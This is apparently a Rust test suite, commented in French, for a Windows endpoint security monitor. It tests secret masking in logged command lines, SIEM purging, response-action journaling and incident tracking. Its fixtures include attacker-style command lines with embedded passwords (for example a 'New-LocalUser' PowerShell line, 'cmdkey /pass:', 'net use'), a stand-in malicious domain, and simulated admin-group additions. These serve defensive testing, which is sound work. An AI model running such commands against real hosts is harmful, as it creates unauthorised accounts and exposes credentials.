        let _ = masquer_secrets(s);
    });
    for bord in ["", " ", "-p", "/p:", "--password=", "\"", "'", "-Password '", "net use", "net", "https://", "a://b:@", "://:@",
                 "ConvertTo-SecureString", "-Credential", "/rp \"", "é-p", "-pé"] {
        let _ = masquer_secrets(bord);
    }
}

/// Revue de #269 : `/p`, `/rp`, `-p`, `-P`, `-pw`, `-u` ne portent un secret que pour les outils listés (décision pure) ;
/// l'outil courant est remis à zéro par un séparateur de commandes
#[test]
fn masquer_secrets_options_par_outil() {
    use crate::commun::{secret_d_option, Masque};
    assert_eq!(secret_d_option("schtasks", "/P"), Some(Masque::Suivant(None)));
    assert_eq!(secret_d_option("xcopy", "/p"), None);
    assert_eq!(secret_d_option("", "/p"), None);
    assert_eq!(secret_d_option("ssh", "-p"), None);
    assert_eq!(secret_d_option("scp", "-P"), None);
    assert_eq!(secret_d_option("psexec", "-p"), Some(Masque::Suivant(None)));
    assert_eq!(secret_d_option("mysql", "-p"), None, "-p seul : invite");
    assert_eq!(secret_d_option("mysql", "-pX"), Some(Masque::Dans(2)));
    assert_eq!(secret_d_option("sqlcmd", "-p"), None, "casse exacte : -p n'est pas -P");
    assert_eq!(secret_d_option("curl", "-u"), Some(Masque::Suivant(Some(':'))));
    assert_eq!(secret_d_option("curl", "-ua:b"), Some(Masque::Dans(4)));
    assert_eq!(secret_d_option("curl", "-ua"), None);
    assert_eq!(secret_d_option("ssh", "--password=x"), Some(Masque::Dans(11)), "formes globales pour tout outil");
    // Tête de commande (revue de #269, D2) : après un séparateur, « : », `cmd /c`, `powershell -c` ; commande d'un lanceur
    // direct : ni option, ni valeur d'option, ni poste, ni titre entre guillemets
    use crate::commun::{commande_lancee, tete_apres};
    assert!(tete_apres("cmd", "/C") && tete_apres("powershell", "-Command") && tete_apres("schtasks", "&&") && tete_apres("x", ":"));
    assert!(!tete_apres("schtasks", "/c") && !tete_apres("cmd", "cmd.exe"));
    assert!(commande_lancee("sshpass", "ssh", "Secret") && commande_lancee("start", "ssh", "\"\""));
    assert!(!commande_lancee("sshpass", "Secret", "-p") && !commande_lancee("psexec", r"\\srv", "psexec") && !commande_lancee("schtasks", "cmd.exe", "/tr"));
    // D3 : drapeaux de psexec et options de start sautés, valeurs d'options non ; « : » collé ; outils à secret
    assert!(commande_lancee("psexec", "schtasks", "-d") && commande_lancee("start", "ssh", "/wait") && commande_lancee("call", "x", "call"));
    assert!(!commande_lancee("psexec", "admin", "-u") && !commande_lancee("start", r"C:\dossier", "/d"));
    assert!(tete_apres("x", "créé:") && !tete_apres("x", "/user:") && !tete_apres("x", "C:"));
    assert!(crate::commun::outil_a_secret("schtasks") && crate::commun::outil_a_secret("plink") && !crate::commun::outil_a_secret("ssh"));
    let m = crate::commun::masquer_secrets("sqlcmd -P Secr3t & ssh -P 2222 h");
    assert!(!m.contains("Secr3t") && m.ends_with("ssh -P 2222 h"), "{m}");
}

/// A-6-1 : les alertes (alertes.json, journal, export syslog et API, notifications, SIEM) passent par `borner_alerte`, qui
/// masque les secrets des raisons et de la destination ; la décision a déjà été prise sur le texte entier
#[test]
fn alerte_bornee_secrets_masques() {
    let mut a = crate::commun::Alerte {
        raisons: "PowerShell qui télécharge du code : powershell -c New-LocalUser x -Password Hunter2Secret".into(),
        destination: "lancé par cmdkey /pass:AutreSecret9".into(),
        ..Default::default()
    };
    crate::commun::borner_alerte(&mut a);
    assert!(!a.raisons.contains("Hunter2Secret") && a.raisons.contains("PowerShell qui télécharge du code"), "{}", a.raisons);
    assert!(!a.destination.contains("AutreSecret9"), "{}", a.destination);
}

/// A-6-1 : chaînes de processus publiées dans etat.json : ligne de commande et raisons masquées dans la copie publiée ;
/// l'arbre (et l'analyse) garde la ligne entière
#[test]
fn chaines_publiees_secrets_masques() {
    let c = crate::chaines::Chaine {
        noeuds: vec![crate::chaines::NoeudChaine { ligne_commande: "net use \\\\s\\c MotSecretChaine /user:a".into(),
            raisons: "motif : schtasks /rp SecretRaison".into(), ..Default::default() }],
        ..Default::default()
    };
    let publiees = crate::moniteur::chaines_publiees(&vec![c.clone(); 40]);
    assert_eq!(publiees.len(), 30, "30 chaînes au plus");
    assert!(!publiees[0].noeuds[0].ligne_commande.contains("MotSecretChaine") && !publiees[0].noeuds[0].raisons.contains("SecretRaison"));
    assert!(c.noeuds[0].ligne_commande.contains("MotSecretChaine"), "l'original n'est pas touché");
}

/// A-6-1, contrôle du source : la ligne d'un 4688 passe par `masquer_secrets` avant d'être bornée et mise dans le message ;
/// tout événement enregistré aussi (point d'entrée unique du SIEM) ; les règles PRC analysent la ligne non masquée
/// (processus.rs ne masque rien, le masquage vient après la décision, dans borner_alerte)
#[test]
fn structure_4688_et_siem_masques() {
    let siem = include_str!("siem.rs");
    let debut = siem.find("        4688 => {").expect("branche 4688");
    let branche = &siem[debut..debut + siem[debut..].find("        4697 | 7045").expect("branche suivante")];
    assert!(branche.contains(r#"let ligne = commun::masquer_secrets(&v("CommandLine"));"#), "{branche}");
    let enregistrer = &siem[siem.find("pub fn enregistrer(").unwrap()..];
    let enregistrer = &enregistrer[..enregistrer.find("\n}").unwrap()];
    assert!(enregistrer.contains("masquer_secrets(&e.message)"), "{enregistrer}");
    assert!(!include_str!("processus.rs").contains("masquer_secrets"), "les règles PRC voient la ligne entière");
    let moniteur = include_str!("moniteur.rs");
    let brute = &moniteur[moniteur.find("fn ajouter_alerte_brute(").unwrap()..];
    let (decisions, bornage) = (brute.find("mitre::enrichir(&mut a)").unwrap(), brute.find("commun::borner_alerte(&mut a)").unwrap());
    assert!(decisions < bornage && brute.find("apprentissage::signature(&a)").unwrap() < bornage, "décisions avant le masquage");
    assert!(bornage < brute.find("crate::export::alerte(&a)").unwrap() && bornage < brute.find("crate::siem::depuis_alerte(&a)").unwrap());
    assert!(moniteur.contains("chaines: chaines_publiees(&self.chaines)"));
    assert!(moniteur.contains("ligne_commande: origine.as_ref().and_then(|o| o.ligne_commande.as_deref()).map(commun::masquer_secrets)"));
}

/// Audit du 2026-11-23, A-6-3 : purge du SIEM. 30 fichiers dont le dernier (celui du jour) dépasse le plafond : les 29
/// autres restent ; le fichier du jour n'est jamais supprimé, ni par l'âge ni par la taille ; au-delà de 30 jours, supprimé
#[test]
fn siem_purge_par_jour() {
    use crate::siem::{a_supprimer, PLAFOND_JOUR, TAILLE_MAX};
    let jours: Vec<String> = (1..=30).map(|j| format!("202611{j:02}")).collect();
    let mut fichiers: Vec<(String, u64)> = jours.iter().map(|j| (j.clone(), 10 * 1024 * 1024)).collect();
    fichiers[29].1 = 3 * TAILLE_MAX;
    assert!(a_supprimer(&fichiers, "20261024", "20261130").is_empty(), "le jour en excès ne chasse pas les autres");
    // Total au-delà de 1 Go sans le jour courant : les plus anciens partent, jamais le jour courant
    let gros: Vec<(String, u64)> = jours.iter().map(|j| (j.clone(), TAILLE_MAX / 10)).collect();
    let s = a_supprimer(&gros, "20261024", "20261130");
    assert!(!s.is_empty() && s.iter().all(|(i, taille)| *taille && *i < 29), "{s:?}");
    assert_eq!(s.iter().map(|x| x.0).collect::<Vec<_>>(), (0..s.len()).collect::<Vec<_>>(), "les plus anciens d'abord");
    // Âge : avant la limite, supprimé (pas « par la taille »), le jour courant jamais, même daté d'avant la limite
    let vieux = vec![("20261001".to_string(), 1), ("20261124".to_string(), 1), ("20261130".to_string(), 1)];
    assert_eq!(a_supprimer(&vieux, "20261101", "20261130"), [(0, false)]);
    assert!(a_supprimer(&[("20261001".to_string(), 1)], "20261101", "20261001").is_empty(), "jour courant gardé");
    // Plafond par jour : 1 Go / 30
    use crate::siem::place_du_jour;
    assert_eq!(PLAFOND_JOUR, TAILLE_MAX / 30);
    assert!(place_du_jour(0, 100) && place_du_jour(PLAFOND_JOUR - 101, 100));
    assert!(!place_du_jour(PLAFOND_JOUR - 100, 100) && !place_du_jour(u64::MAX, 1), "plafond atteint, sans dépassement d'entier");
}

/// Actions de réponse dans le SIEM, pour la chronologie : l'événement porte l'action, la cible, le résultat et le
/// déclencheur ; le moniteur l'écrit après chaque commande de réponse et pour les blocages automatiques et leur levée
#[test]
fn reponse_journalisee_dans_le_siem() {
    use crate::siem::{evenement_reponse, ACTIONS_DE_REPONSE};
    let e = evenement_reponse("bloquerIp", "203.0.113.5", true, "IP bloquée", "commande d'administrateur");
    assert_eq!((e.source.as_str(), e.type_.as_str(), e.niveau.as_str(), e.destination.as_str()), ("reponse", "bloquerIp", "Info", "203.0.113.5"));
    assert!(e.message.contains("réussi") && e.message.contains("commande d'administrateur"), "{}", e.message);
    let e = evenement_reponse("quarantaine", r"C:\x\a.exe", false, "fichier introuvable", "commande d'administrateur");
    assert_eq!(e.niveau, "Alerte");
    assert!(e.message.contains("refusé ou en échec") && e.message.contains("fichier introuvable"));
    let e = evenement_reponse("tuer", "1234", true, &"x".repeat(5000), "automatique : règle");
    assert!(e.message.chars().count() < 500, "message borné");
    // Audit de #94, S94-01 : cible venue du canal, même refusée par la validation : bornée et nettoyée
    let cible = format!("a\u{202E}b\n{}", "y".repeat(70_000));
    let e = evenement_reponse("bloquer", &cible, false, "nom refusé", "commande d'administrateur");
    assert!(e.message.chars().count() < 1000 && e.destination.chars().count() <= 300, "cible bornée");
    assert!(!e.message.contains('\u{202E}') && !e.message.contains('\n') && e.message.starts_with("bloquer a?b?"), "{}", &e.message[..40]);
    for a in ["bloquer", "bloquerIp", "debloquer", "tuer", "suspendre", "quarantaine", "restaurer", "isolerProgramme", "panique"] {
        assert!(ACTIONS_DE_REPONSE.contains(&a), "{a}");
    }
    for a in ["config", "reglages", "verification", "exception"] {
        assert!(!ACTIONS_DE_REPONSE.contains(&a), "{a} n'est pas une action de réponse");
    }
    // Contrôle du source : les appels Windows des actions ne s'exécutent pas en test
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    let x = m.find("pub fn executer(").unwrap();
    let corps = &m[x..x + 1200];
    assert!(corps.contains("crate::siem::reponse(&action, &cible, r.ok, &r.message, \"commande d'administrateur\")"));
    assert!(m.contains("crate::siem::reponse(\"bloquerIp\", ip, r.ok, &r.message, &format!(\"automatique : {raison}\"))"));
    assert!(m.contains("crate::siem::reponse(\"debloquer\", &c, r.ok, &r.message, &format!(\"automatique : {pourquoi}\"))"));
    // Suspension automatique d'un programme qui touche un leurre (relecture de #94, D1) : journalisée à chaque tentative
    let v = include_str!("vol_donnees.rs").replace("\r\n", "\n");
    assert!(v.contains("if tentee { suspension_leurre(pid, &programme, &attendu, &file) }"));
    assert!(v.contains("crate::siem::reponse(\"suspendre\", &pid.to_string(), suspendu, &message,"));
}

// ------------------------------------------------------------ phase 4, PR 4.2 : suivi des incidents

fn alerte_incident(niveau: &str, chemin: &str, regle: &str, heure_utc: &str) -> crate::commun::Alerte {
    crate::commun::Alerte { id: crate::commun::nouvel_id(), heure: "2026-10-27 08:00:00".into(), heure_utc: heure_utc.into(), niveau: niveau.into(),
                            chemin: chemin.into(), regle: regle.into(), raisons: "r".into(), ..Default::default() }
}

const T0: &str = "2026-10-27T07:00:00Z";

fn t0() -> i64 {
    crate::commun::secondes_utc(T0).unwrap()
}

#[test]
fn incident_secondes_utc_inverse_de_l_heure() {
    use crate::commun::{heure_utc_de, secondes_utc};
    use std::time::{Duration, UNIX_EPOCH};
    for s in [0u64, 951_868_800, 1_709_251_199, 1_767_225_599, 1_792_891_800] {
        assert_eq!(secondes_utc(&heure_utc_de(UNIX_EPOCH + Duration::from_secs(s))), Some(s as i64));
    }
    for mauvais in ["", "2026-10-27 07:00:00", "2026-13-01T00:00:00Z", "2026-10-27T07:00:00", "+026-10-27T07:00:00Z", "2026-10-27T25:00:00Z"] {
        assert_eq!(secondes_utc(mauvais), None, "{mauvais}");
    }
}

#[test]
fn incident_alerte_ouvre_un_incident() {
    use crate::incidents::{appliquer, EtatIncident, Effet};
    let mut s = Vec::new();
    assert_eq!(appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0()), Effet::Suivi);
    assert_eq!(s.len(), 1);
    assert_eq!((s[0].etat, s[0].niveau.as_str(), s[0].nombre_alertes, s[0].modele), (EtatIncident::Ouvert, "Alerte", 1, 1));
    assert_eq!(s[0].entite, r"programme:c:\outils\a.exe");
    assert_eq!(s[0].regles, ["PER-001"]);
}

#[test]
fn incident_info_n_ouvre_rien() {
    use crate::incidents::{appliquer, Effet};
    let mut s = Vec::new();
    assert_eq!(appliquer(&mut s, &alerte_incident("Info", r"C:\Outils\a.exe", "RES-003", T0), t0()), Effet::Rien);
    assert!(s.is_empty());
}

#[test]
fn incident_meme_entite_rejoint() {
    use crate::incidents::appliquer;
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0());
    // Même chemin (casse comprise), moins de 24 h : rejoint ; règle ajoutée une fois
    appliquer(&mut s, &alerte_incident("Alerte", r"c:\OUTILS\a.exe", "RES-002", "2026-10-27T10:00:00Z"), t0() + 3 * 3600);
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "RES-002", "2026-10-27T11:00:00Z"), t0() + 4 * 3600);
    assert_eq!((s.len(), s[0].nombre_alertes, s[0].regles.len()), (1, 3, 2));
    assert_eq!(s[0].derniere_activite_utc, "2026-10-27T11:00:00Z");
    // Plus de 24 h sans activité : nouvel incident
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", "2026-10-28T12:00:00Z"), t0() + 29 * 3600);
    assert_eq!(s.len(), 2);
    // Résumés bornés : 5 premiers et 5 derniers
    for k in 0..30 {
        appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", "2026-10-28T12:30:00Z"), t0() + 29 * 3600 + k);
    }
    assert_eq!((s[1].alertes.len(), s[1].nombre_alertes), (10, 31));
}

#[test]
fn incident_meme_nom_autre_chemin_separe() {
    use crate::incidents::{appliquer, entite};
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "RES-002", T0), t0());
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Users\essai\AppData\Local\Temp\chrome.exe", "RES-002", T0), t0());
    assert_eq!(s.len(), 2, "deux chrome.exe à des chemins différents");
    // Sans chemin : destination, sinon règle ; jamais le nom seul
    let mut a = alerte_incident("Alerte", "", "DNS-001", T0);
    a.processus = "chrome".into();
    a.destination = "malveillant.example".into();
    assert_eq!(entite(&a), "destination:malveillant.example");
    a.destination = String::new();
    assert_eq!(entite(&a), "regle:DNS-001");
    a.chemin = "?".into();
    assert_eq!(entite(&a), "regle:DNS-001", "chemin inconnu (« ? ») ignoré");
    // Audit de #95, S95-05 : deux chemins longs qui ne diffèrent qu'à la fin restent deux entités, bornées
    let long = format!(r"C:\Outils\{}", "dossier\\".repeat(60));
    let (e1, e2) = (entite(&alerte_incident("Alerte", &format!("{long}a.exe"), "PER-001", T0)), entite(&alerte_incident("Alerte", &format!("{long}b.exe"), "PER-001", T0)));
    assert_ne!(e1, e2);
    assert!(e1.chars().count() <= 280 && e2.chars().count() <= 280, "{}", e1.chars().count());
}

#[test]
fn incident_clos_jamais_rouvert_en_silence() {
    use crate::incidents::{appliquer, transition, EtatIncident};
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0());
    let premier = s[0].id.clone();
    transition(&mut s[0], EtatIncident::Clos, "Resolu", "", "S-1-5-32-544", "h", T0).unwrap();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0() + 60);
    assert_eq!(s.len(), 2, "récidive : nouvel incident");
    assert_eq!((s[0].etat, s[1].etat), (EtatIncident::Clos, EtatIncident::Ouvert));
    assert_eq!(s[1].precedent, premier);
}

#[test]
fn incident_niveau_ne_baisse_pas() {
    use crate::incidents::appliquer;
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Critique", r"C:\Outils\a.exe", "LEU-002", T0), t0());
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "RES-002", T0), t0() + 10);
    assert_eq!(s[0].niveau, "Critique");
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "RES-002", T0), t0());
    appliquer(&mut s, &alerte_incident("Critique", r"C:\Outils\a.exe", "LEU-002", T0), t0() + 10);
    assert_eq!(s[0].niveau, "Critique", "monte");
}

#[test]
fn incident_transition_interdite_refusee() {
    use crate::incidents::{appliquer, transition, EtatIncident::*};
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0());
    let i = &mut s[0];
    assert!(transition(i, Ouvert, "", "", "S-1-5-32-544", "h", T0).is_err(), "Ouvert vers Ouvert");
    assert!(transition(i, Clos, "", "", "S-1-5-32-544", "h", T0).is_err(), "clôture sans motif");
    assert!(transition(i, Clos, "Oublie", "", "S-1-5-32-544", "h", T0).is_err(), "motif inconnu");
    assert!(transition(i, PrisEnCharge, "Resolu", "", "S-1-5-32-544", "h", T0).is_err(), "motif hors clôture");
    assert!(transition(i, PrisEnCharge, "", "", "", "h", T0).is_err(), "auteur inconnu (S95-03)");
    assert!(i.transitions.is_empty() && i.etat == Ouvert, "rien d'écrit");
    transition(i, PrisEnCharge, "", "vu par le prestataire", "S-1-5-32-544", "h1", T0).unwrap();
    transition(i, Clos, "FauxPositif", "", "S-1-5-32-544", "h2", T0).unwrap();
    assert!(transition(i, PrisEnCharge, "", "", "S-1-5-32-544", "h3", T0).is_err(), "Clos vers PrisEnCharge");
    assert_eq!((i.etat, i.motif_cloture.as_str(), i.transitions.len()), (Clos, "FauxPositif", 2));
    assert_eq!((i.transitions[0].de, i.transitions[0].vers, i.transitions[0].auteur.as_str()), (Ouvert, PrisEnCharge, "S-1-5-32-544"));
    // Réouverture explicite : le motif est effacé, l'historique garde la clôture
    transition(i, Ouvert, "", "nouvelle analyse", "S-1-5-32-544", "h4", T0).unwrap();
    assert_eq!((i.etat, i.motif_cloture.as_str(), i.transitions.len()), (Ouvert, "", 3));
}

#[test]
fn incident_note_bornee_et_nettoyee() {
    use crate::incidents::{appliquer, transition, EtatIncident::*};
    let mut s = Vec::new();
    appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\a.exe", "PER-001", T0), t0());
    for note in ["x".repeat(10_000), "a\nb".to_string(), "texte \u{202E}inversé".to_string(), "\u{200B}".to_string()] {
        assert!(transition(&mut s[0], PrisEnCharge, "", &note, "S-1-5-32-544", "h", T0).is_err(), "{note:?}");
    }
    assert!(s[0].transitions.is_empty());
    assert!(transition(&mut s[0], PrisEnCharge, "", &"é".repeat(300), "S-1-5-32-544", "h", T0).is_ok(), "300 caractères");
}

#[test]
fn incident_purge_clos_d_abord() {
    use crate::incidents::{appliquer, transition, Effet, EtatIncident, MAX_INCIDENTS};
    let mut s = Vec::new();
    for k in 0..MAX_INCIDENTS {
        appliquer(&mut s, &alerte_incident("Alerte", &format!(r"C:\Outils\{k}.exe"), "PER-001", T0), t0());
    }
    transition(&mut s[7], EtatIncident::Clos, "Resolu", "", "S-1-5-32-544", "h", T0).unwrap();
    let clos = s[7].id.clone();
    // 501e : le clos part, aucun non clos
    assert_eq!(appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\nouveau.exe", "PER-001", T0), t0()), Effet::Suivi);
    assert_eq!(s.len(), MAX_INCIDENTS);
    assert!(!s.iter().any(|i| i.id == clos));
    assert_eq!(s.iter().filter(|i| i.etat != EtatIncident::Clos).count(), MAX_INCIDENTS);
    // Plein de non clos : la nouvelle entité n'est pas suivie (comptée par l'appelant), la jonction reste possible
    assert_eq!(appliquer(&mut s, &alerte_incident("Alerte", r"C:\Outils\encore.exe", "PER-001", T0), t0()), Effet::NonSuivi);
    assert_eq!(s.len(), MAX_INCIDENTS);
    assert_eq!(appliquer(&mut s, &alerte_incident("Critique", r"C:\Outils\3.exe", "LEU-002", T0), t0() + 5), Effet::Suivi);
    // Fichier relu de plus de 500 incidents : les clos partent d'abord, les non clos jamais ; le surplus est compté
    use crate::incidents::{purger, IncidentSuivi};
    let mut relu: Vec<IncidentSuivi> = (0..MAX_INCIDENTS + 1).map(|k| IncidentSuivi { id: format!("n{k}"), ..Default::default() }).collect();
    relu.push(IncidentSuivi { id: "clos".into(), etat: EtatIncident::Clos, ..Default::default() });
    assert_eq!(purger(&mut relu), 1, "un non clos de trop, compté");
    assert_eq!(relu.len(), MAX_INCIDENTS + 1);
    assert!(!relu.iter().any(|i| i.id == "clos") && relu[0].id == "n0", "le clos est parti, aucun non clos");
}

#[test]
fn incident_fichier_mal_forme_tolere() {
    use crate::incidents::lire_suivi_texte;
    let texte = format!(r#"[{{"Id":"a1","Niveau":"Alerte","Etat":"Ouvert","Entite":"regle:PER-001"}}, {{"Id":5}}, "texte",
        {{"Id":"a2","Etat":"Clos","Transitions":[{{"De":"Ouvert","Vers":"Clos","Note":"{}"}}],"Alertes":[{}]}}]"#,
        "n".repeat(5000), (0..40).map(|k| format!(r#"{{"Id":"r{k}"}}"#)).collect::<Vec<_>>().join(","));
    let (s, ecartes) = lire_suivi_texte(&texte).unwrap();
    assert_eq!((s.len(), ecartes), (2, 2));
    assert_eq!(s[1].transitions[0].note.chars().count(), crate::incidents::MAX_NOTE, "note relue bornée");
    assert_eq!(s[1].alertes.len(), 10, "résumés relus bornés");
    assert_eq!((s[1].alertes[0].id.as_str(), s[1].alertes[9].id.as_str()), ("r0", "r39"));
    assert!(lire_suivi_texte("{}").is_none() && lire_suivi_texte("pas du json").is_none());
    torturer_texte("[{\"Id\":\"a\",\"Etat\":\"Clos\"}]", &mut |t| { let _ = lire_suivi_texte(t); });
}

/// Commande `incident` : validée champ par champ ; l'auteur ne vient jamais de la commande, mais du jeton du client
#[test]
fn incident_commande_validee_et_auteur_du_jeton() {
    use crate::commun::Commande;
    use crate::validation::{autorisee, valider, Client};
    let c = |cible: &str, valeur: &str, type_: Option<&str>, raison: Option<&str>| Commande {
        action: Some("incident".into()), cible: Some(cible.into()), valeur: Some(valeur.into()), type_: type_.map(Into::into),
        raison: raison.map(Into::into), ..Default::default() };
    assert!(valider(&c("01dd6556a152bba9-000029b8-0000", "PrisEnCharge", None, None)).is_ok());
    assert!(valider(&c("01dd6556a152bba9-000029b8-0000", "Clos", Some("Resolu"), Some("corrigé"))).is_ok());
    assert!(valider(&c("../x", "Clos", Some("Resolu"), None)).is_err(), "identifiant");
    assert!(valider(&c("01dd6556a152bba9-000029b8-0000", "Supprime", None, None)).is_err(), "état");
    assert!(valider(&c("01dd6556a152bba9-000029b8-0000", "Clos", Some("Ignore"), None)).is_err(), "motif");
    assert!(valider(&c("01dd6556a152bba9-000029b8-0000", "Clos", Some("Resolu"), Some(&"x".repeat(301)))).is_err(), "note");
    assert!(autorisee("incident", Client::Administrateur) && !autorisee("incident", Client::Autre));
    let lu: Commande = serde_json::from_str(r#"{"Action":"incident","Cible":"x","Valeur":"Clos","Auteur":"S-1-5-18"}"#).unwrap();
    assert!(lu.auteur.is_empty(), "auteur jamais pris dans la commande");
    let canal = include_str!("canal.rs").replace("\r\n", "\n");
    assert!(canal.contains("let (client, sid) = crate::natif::identite_client_tube(tube);") && canal.contains("c.auteur = sid;"));
}

/// Audit de #95, S95-01 : 500 incidents au pire (toutes les listes et tous les textes à leur borne, en caractères de
/// 4 octets) tiennent sous la taille maximale de lecture du suivi : un suivi plein ne se fige jamais au redémarrage
#[test]
fn incident_suivi_plein_pire_cas() {
    use crate::incidents::{borner_incident, IncidentSuivi, ResumeAlerte, Transition, MAX_INCIDENTS, TAILLE_MAX_SUIVI};
    let x: String = "\u{10FFFF}".repeat(5000);
    let r = ResumeAlerte { id: x.clone(), heure: x.clone(), heure_utc: x.clone(), niveau: x.clone(), regle: x.clone(), processus: x.clone(),
                           chemin: x.clone(), destination: x.clone(), raisons: x.clone() };
    let tr = Transition { heure: x.clone(), heure_utc: x.clone(), motif: x.clone(), auteur: x.clone(), note: x.clone(), ..Default::default() };
    let mut i = IncidentSuivi { modele: u32::MAX, id: x.clone(), ouverture: x.clone(), ouverture_utc: x.clone(), derniere_activite_utc: x.clone(),
                                niveau: x.clone(), entite: x.clone(), regles: vec![x.clone(); 100], motif_cloture: x.clone(), precedent: x.clone(),
                                alertes: vec![r; 100], nombre_alertes: u32::MAX, transitions: vec![tr; 100], ..Default::default() };
    borner_incident(&mut i);
    let octets = serde_json::to_vec(&i).unwrap().len() as u64;
    assert!(octets * MAX_INCIDENTS as u64 + 1024 < TAILLE_MAX_SUIVI, "pire cas : {octets} octets par incident, {} Mo pour 500", octets * 500 / 1_048_576);
    // Les résumés créés en direct ont les mêmes bornes et le même nettoyage (S95-02)
    let mut a = alerte_incident("Alerte", &format!(r"C:\Outils\{}\a.exe", "\u{202E}".repeat(2000)), "PER-001", T0);
    a.processus = "p".repeat(5000);
    let mut s = Vec::new();
    crate::incidents::appliquer(&mut s, &a, t0());
    let mut relu = s[0].clone();
    borner_incident(&mut relu);
    assert_eq!(relu, s[0], "créé et relu identiques : l'entité relue retrouve son incident");
    assert!(!s[0].entite.contains('\u{202E}') && !s[0].alertes[0].chemin.contains('\u{202E}'));
}

/// Relecture de #95, D1 : suivi lu en partie, copie mise de côté avant la réécriture ; trop grand, mis de côté ;
/// illisible, jamais réécrit
#[test]
fn incident_decision_au_demarrage() {
    use crate::incidents::{decision_suivi, DecisionSuivi, TAILLE_MAX_SUIVI};
    assert_eq!(decision_suivi(false, 0, None), DecisionSuivi::Vide);
    assert!(matches!(decision_suivi(true, 10, Some(r#"[{"Id":"a"}]"#)), DecisionSuivi::Lire(s) if s.len() == 1));
    assert!(matches!(decision_suivi(true, 10, Some(r#"[{"Id":"a"}, {"Id":5}]"#)), DecisionSuivi::LirePartiel(s, 1) if s.len() == 1));
    assert_eq!(decision_suivi(true, TAILLE_MAX_SUIVI + 1, None), DecisionSuivi::TropGrand);
    assert_eq!(decision_suivi(true, 10, None), DecisionSuivi::Illisible, "droits refusés");
    assert_eq!(decision_suivi(true, 10, Some("{}")), DecisionSuivi::Illisible, "pas un tableau");
    // Branchement : écriture permise seulement si la mise de côté a réussi
    let s = include_str!("incidents.rs").replace("\r\n", "\n");
    assert!(s.contains("let ok = mettre_de_cote(&f, \"partiel\", true);") && s.contains("(s, ok)"));
    assert!(s.contains("let ok = mettre_de_cote(&f, \"trop-grand\", false);") && s.contains("(Vec::new(), ok)"));
}

// ------------------------------------------------------------ phase 4, PR 4.3 : chronologie et entité des corrélations

fn evenement_chrono(source: &str, heure_utc: &str, seq: u64, champs: &[(&str, &str)]) -> crate::siem::Evenement {
    let mut e = crate::siem::Evenement { source: source.into(), heure_utc: heure_utc.into(), seq, heure: "h".into(), niveau: "Info".into(),
                                         message: format!("{source} {seq}"), ..Default::default() };
    for (c, v) in champs {
        match *c {
            "processus" => e.processus = v.to_string(),
            "ip" => e.ip = v.to_string(),
            "destination" => e.destination = v.to_string(),
            "utilisateur" => e.utilisateur = v.to_string(),
            "regle" => e.regle = v.to_string(),
            "message" => e.message = v.to_string(),
            _ => panic!("{c}"),
        }
    }
    e
}

fn incident_chrono(entite: &str) -> crate::incidents::IncidentSuivi {
    crate::incidents::IncidentSuivi { id: "i1".into(), entite: entite.into(), ouverture_utc: "2026-10-27T07:00:00Z".into(),
                                      derniere_activite_utc: "2026-10-27T08:00:00Z".into(), ..Default::default() }
}

/// Corrélations du SIEM : l'entité est la source (adresse ou compte), et R1 puis R2 de la même source rejoignent le même
/// incident ; deux sources font deux incidents
#[test]
fn chronologie_entite_des_correlations() {
    use crate::siem::Correlation;
    let mut c = Correlation::default();
    let mut entites = Vec::new();
    for ip in ["192.0.2.10", "192.0.2.11"] {
        for _ in 0..5 {
            entites.extend(c.analyser(&crate::tests_detection::evenement_siem("echec-session", &[("ip", ip), ("utilisateur", "essai")])).into_iter().map(|i| (i.regle, i.entite)));
        }
    }
    entites.extend(c.analyser(&crate::tests_detection::evenement_siem("ouverture-session", &[("ip", "192.0.2.10"), ("utilisateur", "essai")])).into_iter().map(|i| (i.regle, i.entite)));
    // R1 : la source des échecs ; R2 et R9 (adresse publique) : le compte qui a ouvert la session
    assert_eq!(entites, [("R1".to_string(), "source:192.0.2.10".to_string()), ("R1".into(), "source:192.0.2.11".into()), ("R2".into(), "compte:essai".into()),
                         ("R9".into(), "compte:essai".into())]);
    // L'alerte levée par l'incident porte son entité
    let mut c = Correlation::default();
    let i: Vec<_> = (0..5).flat_map(|_| c.analyser(&crate::tests_detection::evenement_siem("echec-session", &[("ip", "192.0.2.12"), ("utilisateur", "essai")]))).collect();
    let a = crate::siem::alerte_de_correlation(&i[0]);
    assert_eq!((a.regle.as_str(), a.entite.as_str()), ("COR-R1", "source:192.0.2.12"));
    // Dans le suivi : l'entité nommée par le producteur passe avant la destination ; R2 et R9 du même compte se rejoignent
    let mut a = alerte_incident("Alerte", "", "COR-R9", T0);
    a.destination = "incident : Session ouverte depuis Internet".into();
    a.entite = "compte:essai".into();
    let mut b = alerte_incident("Critique", "", "COR-R2", T0);
    b.destination = "incident : Session ouverte après une série d'échecs".into();
    b.entite = "compte:essai".into();
    let mut s = Vec::new();
    crate::incidents::appliquer(&mut s, &a, t0());
    crate::incidents::appliquer(&mut s, &b, t0() + 60);
    assert_eq!((s.len(), s[0].niveau.as_str(), s[0].regles.len()), (1, "Critique", 2));
    // Compte pour COR-R3
    let e = [crate::tests_detection::evenement_siem("compte-cree", &[("destination", r"POSTE\nouveau")]), crate::tests_detection::evenement_siem("ajout-administrateurs", &[("processus", r"POSTE\nouveau")])];
    let mut c = Correlation::default();
